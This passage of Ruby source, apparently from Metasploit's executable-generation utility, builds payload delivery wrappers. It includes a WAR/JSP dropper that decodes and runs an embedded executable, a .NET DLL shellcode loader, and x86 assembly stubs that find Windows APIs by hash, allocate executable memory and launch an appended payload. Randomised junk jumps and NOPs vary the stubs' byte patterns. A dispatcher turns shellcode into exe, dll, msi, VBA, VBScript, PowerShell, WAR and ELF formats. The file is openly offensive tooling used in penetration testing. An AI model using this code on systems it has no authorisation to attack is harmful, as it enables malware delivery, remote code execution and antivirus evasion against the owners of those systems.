    zip.build_manifest :main_class => "metasploit.Payload"
    config = "Spawn=#{spawn}\r\nExecutable=#{exe_name}\r\n"
    zip.add_file("metasploit.dat", config)
    zip.add_file(exe_name, exe)

    zip
  end

  # Creates a Web Archive (WAR) file from the provided jsp code.
  #
  # On Tomcat, WAR files will be deployed into a directory with the same name
  # as the archive, e.g. +foo.war+ will be extracted into +foo/+. If the
  # server is in a default configuration, deoployment will happen
  # automatically. See
  # {http://tomcat.apache.org/tomcat-5.5-doc/config/host.html the Tomcat
  # documentation} for a description of how this works.
  #
  # @param jsp_raw [String] JSP code to be added in a file called +jsp_name+
  #   in the archive. This will be compiled by the victim servlet container
  #   (e.g., Tomcat) and act as the main function for the servlet.
  # @param opts [Hash]
  # @option opts :jsp_name [String] Name of the <jsp-file> in the archive
  #   _without the .jsp extension_. Defaults to random.
  # @option opts :app_name [String] Name of the app to put in the <servlet-name>
  #   tag. Mostly irrelevant, except as an identifier in web.xml. Defaults to
  #   random.
  # @option opts :extra_files [Array<String,String>] Additional files to add
  #   to the archive. First elment is filename, second is data
  #
  # @todo Refactor to return a {Rex::Zip::Archive} or {Rex::Zip::Jar}
  #
  # @return [String]
  def self.to_war(jsp_raw, opts={})
    jsp_name = opts[:jsp_name]
    jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
    app_name = opts[:app_name]
    app_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)

    meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
    manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
    web_xml = %q{<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>NAME</servlet-name>
<jsp-file>/PAYLOAD.jsp</jsp-file>
</servlet>
</web-app>
}
    web_xml.gsub!(/NAME/, app_name)
    web_xml.gsub!(/PAYLOAD/, jsp_name)

    zip = Rex::Zip::Archive.new
    zip.add_file('META-INF/', '', meta_inf)
    zip.add_file('META-INF/MANIFEST.MF', manifest)
    zip.add_file('WEB-INF/', '')
    zip.add_file('WEB-INF/web.xml', web_xml)
    # add the payload
    zip.add_file("#{jsp_name}.jsp", jsp_raw)

    # add extra files
    if opts[:extra_files]
      opts[:extra_files].each { |el|
        zip.add_file(el[0], el[1])
      }
    end

    return zip.pack
  end

  # Creates a Web Archive (WAR) file containing a jsp page and hexdump of a
  # payload.  The jsp page converts the hexdump back to a normal binary file
  # and places it in the temp directory. The payload file is then executed.
  #
  # @see to_war
  # @param exe [String] Executable to drop and run.
  # @param opts (see to_war)
  # @option opts (see to_war)
  # @return (see to_war)
  def self.to_jsp_war(exe, opts={})

    # begin <payload>.jsp
    hash_sub = {}
    hash_sub[:var_hexpath]       = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_exepath]       = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_data]          = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_inputstream]   = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_outputstream]  = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_numbytes]      = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_bytearray]     = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_bytes]         = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_counter]       = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_char1]         = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_char2]         = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_comb]          = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_exe]           = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_hexfile]       = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_proc]          = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_fperm]         = Rex::Text.rand_text_alpha(rand(8)+8)
    hash_sub[:var_fdel]          = Rex::Text.rand_text_alpha(rand(8)+8)

    # Specify the payload in hex as an extra file..
    payload_hex = exe.unpack('H*')[0]
    opts.merge!(
      {
        :extra_files =>
          [
            [ "#{hash_sub[:var_hexfile]}.txt", payload_hex ]
          ]
      })

    template = read_replace_script_template("to_exe_jsp.war.template", hash_sub)

    return self.to_war(template, opts)
  end

  # Creates a .NET DLL which loads data into memory
  # at a specified location with read/execute permissions
  #    - the data will be loaded at: base+0x2065
  #    - default max size is 0x8000 (32768)
  def self.to_dotnetmem(base=0x12340000, data="", opts={})

    # Allow the user to specify their own DLL template
    set_template_default(opts, "dotnetmem.dll")

    pe = ''
    File.open(opts[:template], "rb") { |fd|
      pe = fd.read(fd.stat.size)
    }

    # Configure the image base
    base_offset = opts[:base_offset] || 180
    pe[base_offset, 4] = [base].pack('V')

    # Configure the TimeDateStamp
    timestamp_offset = opts[:timestamp_offset] || 136
    pe[timestamp_offset, 4] = [rand(0x100000000)].pack('V')

    # XXX: Unfortunately we cant make this RWX only RX
    # Mark this segment as read-execute AND writable
    # pe[412,4] = [0xe0000020].pack("V")

    # Write the data into the .text segment
    text_offset = opts[:text_offset] || 0x1065
    text_max    = opts[:text_max] || 0x8000
    pack        = opts[:pack] || 'a32768'
    pe[text_offset, text_max] = [data].pack(pack)

    # Generic a randomized UUID
    uuid_offset = opts[:uuid_offset] || 37656
    pe[uuid_offset,16] = Rex::Text.rand_text(16)

    return pe
  end


  def self.encode_stub(framework, arch, code, platform = nil, badchars='')
    return code if not framework.encoders
    framework.encoders.each_module_ranked('Arch' => arch) do |name, mod|
      begin
        enc = framework.encoders.create(name)
        raw = enc.encode(code, badchars, nil, platform)
        return raw if raw
      rescue
      end
    end
    nil
  end

  def self.generate_nops(framework, arch, len, opts={})
    opts['BadChars'] ||= ''
    opts['SaveRegisters'] ||= [ 'esp', 'ebp', 'esi', 'edi' ]

    return nil if not framework.nops
    framework.nops.each_module_ranked('Arch' => arch) do |name, mod|
      begin
        nop = framework.nops.create(name)
        raw = nop.generate_sled(len, opts)
        return raw if raw
      rescue
      end
    end
    nil
  end

  # This wrapper is responsible for allocating RWX memory, copying the
  # target code there, setting an exception handler that calls ExitProcess
  # and finally executing the code.
  def self.win32_rwx_exec(code)

    stub_block = %Q^
    ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
    ; Output: The return value from the API call will be in EAX.
    ; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
    ; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
    ; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
    ; Note: This function is unable to call forwarded exports.

    api_call:
      pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
      mov ebp, esp           ; Create a new stack frame
      xor edx, edx           ; Zero EDX
      mov edx, [fs:edx+48]   ; Get a pointer to the PEB
      mov edx, [edx+12]      ; Get PEB->Ldr
      mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
    next_mod:                ;
      mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
      movzx ecx, word [edx+38] ; Set ECX to the length we want to check
      xor edi, edi           ; Clear EDI which will store the hash of the module name
    loop_modname:            ;
      xor eax, eax           ; Clear EAX
      lodsb                  ; Read in the next byte of the name
      cmp al, 'a'            ; Some versions of Windows use lower case module names
      jl not_lowercase       ;
      sub al, 0x20           ; If so normalise to uppercase
    not_lowercase:           ;
      ror edi, 13            ; Rotate right our hash value
      add edi, eax           ; Add the next byte of the name
      ;loop loop_modname      ; Loop until we have read enough
      ; The random jmps added below will occasionally make this offset
      ; greater than will fit in a byte, so we have to use a regular jnz
      ; instruction which can take a full 32-bits to accomodate the
      ; bigger offset
      dec ecx
      jnz loop_modname        ; Loop until we have read enough
      ; We now have the module hash computed
      push edx               ; Save the current position in the module list for later
      push edi               ; Save the current module hash for later
      ; Proceed to iterate the export address table,
      mov edx, [edx+16]      ; Get this modules base address
      mov eax, [edx+60]      ; Get PE header
      add eax, edx           ; Add the modules base address
      mov eax, [eax+120]     ; Get export tables RVA
      test eax, eax          ; Test if no export address table is present
      jz get_next_mod1       ; If no EAT present, process the next module
      add eax, edx           ; Add the modules base address
      push eax               ; Save the current modules EAT
      mov ecx, [eax+24]      ; Get the number of function names
      mov ebx, [eax+32]      ; Get the rva of the function names
      add ebx, edx           ; Add the modules base address
      ; Computing the module hash + function hash
    get_next_func:           ;
      test ecx, ecx          ; Changed from jecxz to accomodate the larger offset produced by random jmps below
      jz get_next_mod        ; When we reach the start of the EAT (we search backwards), process the next module
      dec ecx                ; Decrement the function name counter
      mov esi, [ebx+ecx*4]   ; Get rva of next module name
      add esi, edx           ; Add the modules base address
      xor edi, edi           ; Clear EDI which will store the hash of the function name
      ; And compare it to the one we want
    loop_funcname:           ;
      xor eax, eax           ; Clear EAX
      lodsb                  ; Read in the next byte of the ASCII function name
      ror edi, 13            ; Rotate right our hash value
      add edi, eax           ; Add the next byte of the name
      cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
      jne loop_funcname      ; If we have not reached the null terminator, continue
      add edi, [ebp-8]       ; Add the current module hash to the function hash
      cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
      jnz get_next_func      ; Go compute the next function hash if we have not found it
      ; If found, fix up stack, call the function and then value else compute the next one...
      pop eax                ; Restore the current modules EAT
      mov ebx, [eax+36]      ; Get the ordinal table rva
      add ebx, edx           ; Add the modules base address
      mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
      mov ebx, [eax+28]      ; Get the function addresses table rva
      add ebx, edx           ; Add the modules base address
      mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
      add eax, edx           ; Add the modules base address to get the functions actual VA
      ; We now fix up the stack and perform the call to the desired function...
    finish:
      mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
      pop ebx                ; Clear off the current modules hash
      pop ebx                ; Clear off the current position in the module list
      popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
      pop ecx                ; Pop off the origional return address our caller will have pushed
      pop edx                ; Pop off the hash value our caller will have pushed
      push ecx               ; Push back the correct return value
      jmp eax                ; Jump into the required function
      ; We now automagically return to the correct caller...
    get_next_mod:            ;
      pop eax                ; Pop off the current (now the previous) modules EAT
    get_next_mod1:           ;
      pop edi                ; Pop off the current (now the previous) modules hash
      pop edx                ; Restore our position in the module list
      mov edx, [edx]         ; Get the next module
      jmp next_mod           ; Process this module
    ^

    stub_exit = %Q^
    ; Input: EBP must be the address of 'api_call'.
    ; Output: None.
    ; Clobbers: EAX, EBX, (ESP will also be modified)
    ; Note: Execution is not expected to (successfully) continue past this block

    exitfunk:
      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
      push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
      jl goodbye             ; Then just call the exit function...
      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
      jne goodbye      ;
      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
    goodbye:                 ; We now perform the actual call to the exit function
      push byte 0            ; push the exit function parameter
      push ebx               ; push the hash of the exit function
      call ebp               ; call EXITFUNK( 0 );
    ^

    stub_alloc = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
    delta:                   ;
    #{stub_block}
    start:                   ;
      pop ebp                ; Pop off the address of 'api_call' for calling later.

    allocate_size:
       mov esi, #{code.length}

    allocate:
      push byte 0x40         ; PAGE_EXECUTE_READWRITE
      push 0x1000            ; MEM_COMMIT
      push esi               ; Push the length value of the wrapped code block
      push byte 0            ; NULL as we dont care where the allocation is.
      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

      mov ebx, eax           ; Store allocated address in ebx
      mov edi, eax           ; Prepare EDI with the new address
      mov ecx, esi           ; Prepare ECX with the length of the code
      call get_payload
    got_payload:
      pop esi                ; Prepare ESI with the source to copy
      rep movsb              ; Copy the payload to RWX memory
      call set_handler       ; Configure error handling

    exitblock:
    #{stub_exit}
    set_handler:
      xor eax,eax
      push dword [fs:eax]
      mov dword [fs:eax], esp
      call ebx
      jmp exitblock
    ^

    stub_final = %Q^
    get_payload:
      call got_payload
    payload:
    ; Append an arbitrary payload here
    ^

    stub_alloc.gsub!('short', '')
    stub_alloc.gsub!('byte', '')

    wrapper = ""
    # regs    = %W{eax ebx ecx edx esi edi ebp}

    cnt_jmp = 0
    stub_alloc.each_line do |line|
      line.gsub!(/;.*/, '')
      line.strip!
      next if line.empty?

      if (rand(2) == 0)
        wrapper << "nop\n"
      end

      if(rand(2) == 0)
        wrapper << "jmp autojump#{cnt_jmp}\n"
        1.upto(rand(8)+8) do
          wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
        end
        wrapper << "autojump#{cnt_jmp}:\n"
        cnt_jmp += 1
      end
      wrapper << line + "\n"
    end

    wrapper << stub_final

    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
    res = enc.data + code

    res
  end

  # This wrapper is responsible for allocating RWX memory, copying the
  # target code there, setting an exception handler that calls ExitProcess,
  # starting the code in a new thread, and finally jumping back to the next
  # code to execute. block_offset is the offset of the next code from
  # the start of this code
  def self.win32_rwx_exec_thread(code, block_offset, which_offset='start')

    stub_block = %Q^
    ; Input: The hash of the API to call and all its parameters must be pushed onto stack.
    ; Output: The return value from the API call will be in EAX.
    ; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)
    ; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.
    ; Note: This function assumes the direction flag has allready been cleared via a CLD instruction.
    ; Note: This function is unable to call forwarded exports.

    api_call:
      pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
      mov ebp, esp           ; Create a new stack frame
      xor edx, edx           ; Zero EDX
      mov edx, [fs:edx+48]   ; Get a pointer to the PEB
      mov edx, [edx+12]      ; Get PEB->Ldr
      mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
    next_mod:                ;
      mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
      movzx ecx, word [edx+38] ; Set ECX to the length we want to check
      xor edi, edi           ; Clear EDI which will store the hash of the module name
    loop_modname:            ;
      xor eax, eax           ; Clear EAX
      lodsb                  ; Read in the next byte of the name
      cmp al, 'a'            ; Some versions of Windows use lower case module names
      jl not_lowercase       ;
      sub al, 0x20           ; If so normalise to uppercase
    not_lowercase:           ;
      ror edi, 13            ; Rotate right our hash value
      add edi, eax           ; Add the next byte of the name
      loop loop_modname      ; Loop until we have read enough
      ; We now have the module hash computed
      push edx               ; Save the current position in the module list for later
      push edi               ; Save the current module hash for later
      ; Proceed to iterate the export address table,
      mov edx, [edx+16]      ; Get this modules base address
      mov eax, [edx+60]      ; Get PE header
      add eax, edx           ; Add the modules base address
      mov eax, [eax+120]     ; Get export tables RVA
      test eax, eax          ; Test if no export address table is present
      jz get_next_mod1       ; If no EAT present, process the next module
      add eax, edx           ; Add the modules base address
      push eax               ; Save the current modules EAT
      mov ecx, [eax+24]      ; Get the number of function names
      mov ebx, [eax+32]      ; Get the rva of the function names
      add ebx, edx           ; Add the modules base address
      ; Computing the module hash + function hash
    get_next_func:           ;
      jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
      dec ecx                ; Decrement the function name counter
      mov esi, [ebx+ecx*4]   ; Get rva of next module name
      add esi, edx           ; Add the modules base address
      xor edi, edi           ; Clear EDI which will store the hash of the function name
      ; And compare it to the one we want
    loop_funcname:           ;
      xor eax, eax           ; Clear EAX
      lodsb                  ; Read in the next byte of the ASCII function name
      ror edi, 13            ; Rotate right our hash value
      add edi, eax           ; Add the next byte of the name
      cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
      jne loop_funcname      ; If we have not reached the null terminator, continue
      add edi, [ebp-8]       ; Add the current module hash to the function hash
      cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for
      jnz get_next_func      ; Go compute the next function hash if we have not found it
      ; If found, fix up stack, call the function and then value else compute the next one...
      pop eax                ; Restore the current modules EAT
      mov ebx, [eax+36]      ; Get the ordinal table rva
      add ebx, edx           ; Add the modules base address
      mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
      mov ebx, [eax+28]      ; Get the function addresses table rva
      add ebx, edx           ; Add the modules base address
      mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
      add eax, edx           ; Add the modules base address to get the functions actual VA
      ; We now fix up the stack and perform the call to the desired function...
    finish:
      mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
      pop ebx                ; Clear off the current modules hash
      pop ebx                ; Clear off the current position in the module list
      popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
      pop ecx                ; Pop off the origional return address our caller will have pushed
      pop edx                ; Pop off the hash value our caller will have pushed
      push ecx               ; Push back the correct return value
      jmp eax                ; Jump into the required function
      ; We now automagically return to the correct caller...
    get_next_mod:            ;
      pop eax                ; Pop off the current (now the previous) modules EAT
    get_next_mod1:           ;
      pop edi                ; Pop off the current (now the previous) modules hash
      pop edx                ; Restore our position in the module list
      mov edx, [edx]         ; Get the next module
      jmp next_mod           ; Process this module
    ^

    stub_exit = %Q^
    ; Input: EBP must be the address of 'api_call'.
    ; Output: None.
    ; Clobbers: EAX, EBX, (ESP will also be modified)
    ; Note: Execution is not expected to (successfully) continue past this block

    exitfunk:
      mov ebx, 0x0A2A1DE0    ; The EXITFUNK as specified by user...
      push 0x9DBD95A6        ; hash( "kernel32.dll", "GetVersion" )
      call ebp               ; GetVersion(); (AL will = major version and AH will = minor version)
      cmp al, byte 6         ; If we are not running on Windows Vista, 2008 or 7
      jl goodbye       ; Then just call the exit function...
      cmp bl, 0xE0           ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...
      jne goodbye      ;
      mov ebx, 0x6F721347    ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread
    goodbye:                 ; We now perform the actual call to the exit function
      push byte 0            ; push the exit function parameter
      push ebx               ; push the hash of the exit function
      call ebp               ; call EXITFUNK( 0 );
    ^

    stub_alloc = %Q^
      pushad                 ; Save registers
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
    delta:                   ;
    #{stub_block}
    start:                   ;
      pop ebp                ; Pop off the address of 'api_call' for calling later.

    allocate_size:
       mov esi,#{code.length}

    allocate:
      push byte 0x40         ; PAGE_EXECUTE_READWRITE
      push 0x1000            ; MEM_COMMIT
      push esi               ; Push the length value of the wrapped code block
      push byte 0            ; NULL as we dont care where the allocation is.
      push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
      call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

      mov ebx, eax           ; Store allocated address in ebx
      mov edi, eax           ; Prepare EDI with the new address
      mov ecx, esi           ; Prepare ECX with the length of the code
      call get_payload
    got_payload:
      pop esi                ; Prepare ESI with the source to copy
      rep movsb              ; Copy the payload to RWX memory
      call set_handler       ; Configure error handling

    exitblock:
    #{stub_exit}

    set_handler:
      xor eax,eax
;		  push dword [fs:eax]
;		  mov dword [fs:eax], esp
      push eax               ; LPDWORD lpThreadId (NULL)
      push eax               ; DWORD dwCreationFlags (0)
      push eax               ; LPVOID lpParameter (NULL)
      push ebx               ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
      push eax               ; SIZE_T dwStackSize (0 for default)
      push eax               ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
      push 0x160D6838        ; hash( "kernel32.dll", "CreateThread" )
      call ebp               ; Spawn payload thread

      pop eax                ; Skip
;		  pop eax                ; Skip
      pop eax                ; Skip
      popad                  ; Get our registers back
;		  sub esp, 44             ; Move stack pointer back past the handler
    ^

    stub_final = %Q^
    get_payload:
      call got_payload
    payload:
    ; Append an arbitrary payload here
    ^


    stub_alloc.gsub!('short', '')
    stub_alloc.gsub!('byte', '')

    wrapper = ""
    # regs    = %W{eax ebx ecx edx esi edi ebp}

    cnt_jmp = 0
    cnt_nop = 64

    stub_alloc.each_line do |line|
      line.gsub!(/;.*/, '')
      line.strip!
      next if line.empty?

      if (cnt_nop > 0 and rand(4) == 0)
        wrapper << "nop\n"
        cnt_nop -= 1
      end

      if(cnt_nop > 0 and rand(16) == 0)
        cnt_nop -= 2
        cnt_jmp += 1

        wrapper << "jmp autojump#{cnt_jmp}\n"
        1.upto(rand(8)+1) do
          wrapper << "db 0x#{"%.2x" % rand(0x100)}\n"
          cnt_nop -= 1
        end
        wrapper << "autojump#{cnt_jmp}:\n"
      end
      wrapper << line + "\n"
    end

    #someone who knows how to use metasm please explain the right way to do this.
    wrapper << "db 0xe9\n db 0xFF\n db 0xFF\n db 0xFF\n db 0xFF\n"
    wrapper << stub_final

    enc = Metasm::Shellcode.assemble(Metasm::Ia32.new, wrapper).encoded
    soff = enc.data.index("\xe9\xff\xff\xff\xff") + 1
    res = enc.data + code

    if which_offset == 'start'
      res[soff,4] = [block_offset - (soff + 4)].pack('V')
    elsif which_offset == 'end'
      res[soff,4] = [res.length - (soff + 4) + block_offset].pack('V')
    else
      raise RuntimeError, 'Blast! Msf::Util::EXE.rwx_exec_thread called with invalid offset!'
    end
    res
  end


  #
  # Generate an executable of a given format suitable for running on the
  # architecture/platform pair.
  #
  # This routine is shared between msfencode, rpc, and payload modules (use
  # <payload>)
  #
  # @param framework [Framework]
  # @param arch [String] Architecture for the target format; one of the ARCH_*
  # constants
  # @param plat [#index] platform
  # @param code [String] The shellcode for the resulting executable to run
  # @param fmt [String] One of the executable formats as defined in
  #   {.to_executable_fmt_formats}
  # @param exeopts [Hash] Passed directly to the approrpriate method for
  #   generating an executable for the given +arch+/+plat+ pair.
  # @return [String] An executable appropriate for the given
  #   architecture/platform pair.
  # @return [nil] If the format is unrecognized or the arch and plat don't
  #   make sense together.
  def self.to_executable_fmt(framework, arch, plat, code, fmt, exeopts)
    # For backwards compatibility with the way this gets called when
    # generating from Msf::Simple::Payload.generate_simple
    if arch.kind_of? Array
      output = nil
      arch.each do |a|
        output = to_executable_fmt(framework, a, plat, code, fmt, exeopts)
        break if output
      end
      return output
    end

    case fmt
    when 'asp'
      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
      output = Msf::Util::EXE.to_exe_asp(exe, exeopts)

    when 'aspx'
        output = Msf::Util::EXE.to_mem_aspx(framework, code, exeopts)

    when 'aspx-exe'
      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
      output = Msf::Util::EXE.to_exe_aspx(exe, exeopts)

    when 'dll'
      output = case arch
        when ARCH_X86,nil then to_win32pe_dll(framework, code, exeopts)
        when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
        when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
        end
    when 'exe'
      output = case arch
        when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
        when ARCH_X86_64  then to_win64pe(framework, code, exeopts)
        when ARCH_X64     then to_win64pe(framework, code, exeopts)
        end

    when 'exe-service'
      output = case arch
        when ARCH_X86,nil then to_win32pe_service(framework, code, exeopts)
        when ARCH_X86_64  then to_win64pe_service(framework, code, exeopts)
        when ARCH_X64     then to_win64pe_service(framework, code, exeopts)
      end

    when 'exe-small'
      output = case arch
        when ARCH_X86,nil then to_win32pe_old(framework, code, exeopts)
        end

    when 'exe-only'
      output = case arch
        when ARCH_X86,nil then to_winpe_only(framework, code, exeopts, arch)
        when ARCH_X86_64  then to_winpe_only(framework, code, exeopts, arch)
        when ARCH_X64     then to_winpe_only(framework, code, exeopts, arch)
        end

    when 'msi'
      case arch
        when ARCH_X86,nil
          exe = to_win32pe(framework, code, exeopts)
        when ARCH_X86_64,ARCH_X64
          exe = to_win64pe(framework, code, exeopts)
      end
      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)

    when 'msi-nouac'
      case arch
        when ARCH_X86,nil
          exe = to_win32pe(framework, code, exeopts)
        when ARCH_X86_64,ARCH_X64
          exe = to_win64pe(framework, code, exeopts)
      end
      exeopts[:uac] = true
      output = Msf::Util::EXE.to_exe_msi(framework, exe, exeopts)

    when 'elf'
      if (not plat or (plat.index(Msf::Module::Platform::Linux)))
        output = case arch
          when ARCH_X86,nil then to_linux_x86_elf(framework, code, exeopts)
          when ARCH_X86_64  then to_linux_x64_elf(framework, code, exeopts)
          when ARCH_X64     then to_linux_x64_elf(framework, code, exeopts)
          when ARCH_ARMLE   then to_linux_armle_elf(framework, code, exeopts)
          when ARCH_MIPSBE  then to_linux_mipsbe_elf(framework, code, exeopts)
          when ARCH_MIPSLE  then to_linux_mipsle_elf(framework, code, exeopts)
          end
      elsif(plat and (plat.index(Msf::Module::Platform::BSD)))
        output = case arch
          when ARCH_X86,nil then Msf::Util::EXE.to_bsd_x86_elf(framework, code, exeopts)
          end
      elsif(plat and (plat.index(Msf::Module::Platform::Solaris)))
        output = case arch
          when ARCH_X86,nil then to_solaris_x86_elf(framework, code, exeopts)
          end
      end

    when 'macho'
      output = case arch
        when ARCH_X86,nil then to_osx_x86_macho(framework, code, exeopts)
        when ARCH_X86_64  then to_osx_x64_macho(framework, code, exeopts)
        when ARCH_X64     then to_osx_x64_macho(framework, code, exeopts)
        when ARCH_ARMLE   then to_osx_arm_macho(framework, code, exeopts)
        when ARCH_PPC     then to_osx_ppc_macho(framework, code, exeopts)
        end

    when 'vba'
      output = Msf::Util::EXE.to_vba(framework, code, exeopts)

    when 'vba-exe'
      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
      output = Msf::Util::EXE.to_exe_vba(exe)

    when 'vbs'
      exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
      output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => false }))

    when 'loop-vbs'
      exe = exe = to_executable_fmt(framework, arch, plat, code, 'exe', exeopts)
      output = Msf::Util::EXE.to_exe_vbs(exe, exeopts.merge({ :persist => true }))

    when 'war'
      arch ||= [ ARCH_X86 ]
      tmp_plat = plat.platforms if plat
      tmp_plat ||= Msf::Module::PlatformList.transform('win')
      exe = Msf::Util::EXE.to_executable(framework, arch, tmp_plat, code, exeopts)
      output = Msf::Util::EXE.to_jsp_war(exe)

    when 'psh'
      output = Msf::Util::EXE.to_win32pe_psh(framework, code, exeopts)

    when 'psh-net'
      output = Msf::Util::EXE.to_win32pe_psh_net(framework, code, exeopts)
      
    when 'psh-reflection'
      output = Msf::Util::EXE.to_win32pe_psh_reflection(framework, code, exeopts)

    end

    output
  end

  def self.to_executable_fmt_formats
    [
      "asp",
      "aspx",
      "aspx-exe",
      "dll",
      "elf",
      "exe",
      "exe-only",
      "exe-service",
      "exe-small",
      "loop-vbs",
      "macho",
      "msi",
      "msi-nouac",
      "psh",
      "psh-net",
      "psh-reflection",
      "vba",
      "vba-exe",
      "vbs",
      "war"
    ]
  end

  #
  # EICAR Canary: https://www.metasploit.com/redmine/projects/framework/wiki/EICAR
  #
  def self.is_eicar_corrupted?
    path = ::File.expand_path(::File.join(::File.dirname(__FILE__), "..", "..", "..", "data", "eicar.com"))
    return true if not ::File.exists?(path)

    begin
      data = ::File.read(path)
      if Digest::SHA1.hexdigest(data) != "3395856ce81f2b7382dee72602f798b642f14140"
        return true
      end

    rescue ::Exception
      return true
    end

    false
  end

end
end
end
